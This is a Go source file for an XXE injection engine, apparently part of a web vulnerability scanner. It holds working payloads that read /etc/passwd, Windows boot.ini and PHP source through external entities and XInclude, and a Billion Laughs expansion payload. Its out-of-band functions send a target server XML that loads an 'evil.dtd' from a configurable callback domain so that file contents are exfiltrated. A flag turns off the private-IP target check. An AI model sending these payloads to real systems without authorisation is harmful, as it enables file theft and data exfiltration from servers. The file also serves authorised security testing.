package xxe

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

const maxEntityDepth = 32
const maxEntityExpansion = 1 << 20

type Finding struct {
	URL       string    `json:"url"`
	Type      string    `json:"type"`
	Payload   string    `json:"payload"`
	Evidence  string    `json:"evidence"`
	Severity  string    `json:"severity"`
	Confirmed bool      `json:"confirmed"`
	Timestamp time.Time `json:"timestamp"`
}

type Engine struct {
	client        *http.Client
	oobDomain     string
	skipTargetVal bool
}

func (e *Engine) SetSkipTargetValidation(skip bool) {
	e.skipTargetVal = skip
}

func NewEngine(oobDomain string) *Engine {
	return &Engine{
		client:    &http.Client{Timeout: 15 * time.Second},
		oobDomain: oobDomain,
	}
}

var xxePayloads = []struct {
	name    string
	payload string
	check   func(string) bool
}{
	{
		name: "Basic XXE - /etc/passwd",
		payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`,
		check: func(body string) bool {
			return strings.Contains(body, "root:") || strings.Contains(body, "/bin/bash") ||
				strings.Contains(body, "nobody:")
		},
	},
	{
		name: "XXE - Windows boot.ini",
		payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/boot.ini">
]>
<root>&xxe;</root>`,
		check: func(body string) bool {
			return strings.Contains(body, "[boot loader]") || strings.Contains(body, "[operating systems]")
		},
	},
	{
		name: "XXE - PHP wrapper",
		payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>`,
		check: func(body string) bool {
			return strings.Contains(body, "PD9waHA") || strings.Contains(body, "base64")
		},
	},
	{
		name: "XXE - XInclude",
		payload: `<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>`,
		check: func(body string) bool {
			return strings.Contains(body, "root:") || strings.Contains(body, "/bin/bash")
		},
	},
	{
		name: "XXE - Entity expansion (Billion Laughs)",
		payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>`,
		check: func(body string) bool {
			return strings.Contains(strings.ToLower(body), "entity expansion") ||
				strings.Contains(strings.ToUpper(body), "ERROR") ||
				strings.Contains(body, "entity limit") ||
				strings.Contains(body, "too large")
		},
	},
}

func validateTargetURL(rawURL string) error {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return fmt.Errorf("invalid URL: %w", err)
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return fmt.Errorf("unsupported scheme: %s", parsed.Scheme)
	}
	host := parsed.Hostname()
	if host == "" {
		return fmt.Errorf("empty host")
	}
	ips, err := net.LookupIP(host)
	if err != nil {
		return fmt.Errorf("DNS resolution failed: %w", err)
	}
	for _, ip := range ips {
		if ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() || ip.IsUnspecified() {
			return fmt.Errorf("target resolves to private/internal IP: %s", ip.String())
		}
	}
	return nil
}

func (e *Engine) TestAll(target string) ([]Finding, error) {
	if !e.skipTargetVal {
		if err := validateTargetURL(target); err != nil {
			return nil, fmt.Errorf("SSRF check failed: %w", err)
		}
	}

	var findings []Finding

	for _, p := range xxePayloads {
		f, err := e.testPayload(target, p.name, p.payload, p.check)
		if err == nil && f != nil {
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

func (e *Engine) TestOOB(target string) (*Finding, error) {
	if !e.skipTargetVal {
		if err := validateTargetURL(target); err != nil {
			return nil, fmt.Errorf("SSRF check failed: %w", err)
		}
	}
	if e.oobDomain == "" {
		return nil, fmt.Errorf("OOB domain not configured")
	}

	payload := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY %% xxe SYSTEM "http://%s/xxe.dtd">
  %%xxe;
  %%param1;
]>
<root>&exfil;</root>`, e.oobDomain)

	req, err := http.NewRequest("POST", target, bytes.NewReader([]byte(payload)))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("User-Agent", "ARES-XXE/1.0")

	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return &Finding{
		URL:       target,
		Type:      "xxe_oob",
		Payload:   payload,
		Evidence:  fmt.Sprintf("OOB XXE callback expected at %s", e.oobDomain),
		Severity:  "critical",
		Confirmed: false,
		Timestamp: time.Now(),
	}, nil
}

func (e *Engine) TestBlindXXE(target string) (*Finding, error) {
	if !e.skipTargetVal {
		if err := validateTargetURL(target); err != nil {
			return nil, fmt.Errorf("SSRF check failed: %w", err)
		}
	}
	if e.oobDomain == "" {
		return nil, fmt.Errorf("OOB domain not configured")
	}

	payload := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY %% xxe SYSTEM "http://%s/?file=file:///etc/passwd">
  %%xxe;
]>
<root>test</root>`, e.oobDomain)

	start := time.Now()
	req, err := http.NewRequest("POST", target, bytes.NewReader([]byte(payload)))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("User-Agent", "ARES-XXE/1.0")

	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	duration := time.Since(start)

	return &Finding{
		URL:       target,
		Type:      "xxe_blind_dns",
		Payload:   payload,
		Evidence:  fmt.Sprintf("Blind XXE test completed in %v, check DNS logs at %s", duration, e.oobDomain),
		Severity:  "high",
		Confirmed: false,
		Timestamp: time.Now(),
	}, nil
}

func (e *Engine) TestDTDExfil(target string) (*Finding, error) {
	if !e.skipTargetVal {
		if err := validateTargetURL(target); err != nil {
			return nil, fmt.Errorf("SSRF check failed: %w", err)
		}
	}
	if e.oobDomain == "" {
		return nil, fmt.Errorf("OOB domain not configured")
	}

	payload := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY %% data SYSTEM "file:///etc/passwd">
  <!ENTITY %% dtd SYSTEM "http://%s/evil.dtd">
  %%dtd;
]>
<root>&exfil;</root>`, e.oobDomain)

	req, err := http.NewRequest("POST", target, bytes.NewReader([]byte(payload)))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/xml")

	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return &Finding{
		URL:       target,
		Type:      "xxe_dtd_exfil",
		Payload:   payload,
		Evidence:  fmt.Sprintf("DTD exfil callback expected at %s", e.oobDomain),
		Severity:  "critical",
		Confirmed: false,
		Timestamp: time.Now(),
	}, nil
}

func (e *Engine) testPayload(target, name, payload string, check func(string) bool) (*Finding, error) {
	if strings.Contains(strings.ToLower(payload), "&lol") || strings.Contains(strings.ToLower(payload), "billion laughs") {
		return nil, fmt.Errorf("billion laughs payload rejected: DoS risk")
	}

	depth := countEntityDepth(payload)
	if depth > maxEntityDepth {
		return nil, fmt.Errorf("entity depth %d exceeds limit %d", depth, maxEntityDepth)
	}

	if len(payload) > maxEntityExpansion {
		return nil, fmt.Errorf("payload size %d exceeds expansion limit %d", len(payload), maxEntityExpansion)
	}

	req, err := http.NewRequest("POST", target, bytes.NewReader([]byte(payload)))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("User-Agent", "ARES-XXE/1.0")

	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, maxEntityExpansion))
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %v", err)
	}

	if check(string(body)) {
		return &Finding{
			URL:       target,
			Type:      "xxe",
			Payload:   payload,
			Evidence:  string(body)[:minInt(len(body), 500)],
			Severity:  "critical",
			Confirmed: true,
			Timestamp: time.Now(),
		}, nil
	}

	return nil, fmt.Errorf("no XXE detected for: %s", name)
}

func countEntityDepth(payload string) int {
	depth := 0
	inEntity := false
	for i := 0; i < len(payload); i++ {
		if strings.HasPrefix(payload[i:], "<!ENTITY") {
			inEntity = true
			depth++
		}
		if inEntity && payload[i] == '>' {
			inEntity = false
		}
	}
	return depth
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
